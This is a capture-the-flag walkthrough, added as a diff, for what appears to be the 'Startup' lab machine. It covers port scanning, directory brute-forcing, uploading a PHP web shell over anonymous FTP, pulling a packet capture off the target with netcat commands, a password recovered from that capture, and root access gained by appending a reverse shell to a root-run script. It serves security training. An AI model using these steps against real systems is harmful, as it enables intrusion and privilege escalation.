@@ -1,0 +1,23 @@
+--- Startup ---
+
+1. Check nmap > Ports 21, 22, and 80 are open.
+2. Seeing the port 80 open, we can say it must be a website. Though visiting the website gives nothing.
+3. Use gobuster with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt wordlist to find any hidden directory.
+   We get the /files directory, and this gives us notice.txt and important.jpg files. The file notice.txt mentions about a suspicious
+   activity which states that the file important.jpg was not uploaded by the site admin. We also got another directory /ftp inside 
+   the directory that means we can upload files into this directory using ftp.
+4. We can also see that port 21 is open and it supports anonymous login. Logging into the ftp we get /ftp directory. Let's upload our
+   shell.php file inside this directory using "put shell.php" command.
+5. Listen to our nc (netcat) port and we got a shell which gives us recipe.txt flag. There is also another interesting file named
+   "suspicious.pcapng" in the /incidents directory.
+6. We will share this file on port 1234 on the remote server using "cat suspicious.pcapng | nc -lp 1234" command and get this file
+   on our local machine using "nc 10.10.44.180 1234 > suspicious.pcapng" command.
+7. It's a network capture file, so let's open this file using wireshark.
+8. Let's type "data" into the filtering section. By right-clicking on the TCP protocol, select Follow -> TCP Stream to view the content
+   and we got a password "c4ntg3t3n0ughsp1c3" downwards.
+9. Also if we remember, we had already got an username in the /home directory which is "lennie". Logging into the ssh gives us the
+   user.txt flag and an interesting file "planner.sh" which executes "/etc/print.sh" file.
+10. Let's read the "/etc/print.sh" file, it is an executable file. Now, let's add our reverse shell in it using ">>" operator.
+11. Now run the "/scripts/planner.sh" file and listen to our nc (netcat) port and we got a root shell. This gives us root.txt flag.
+
+--- Enjoy ---
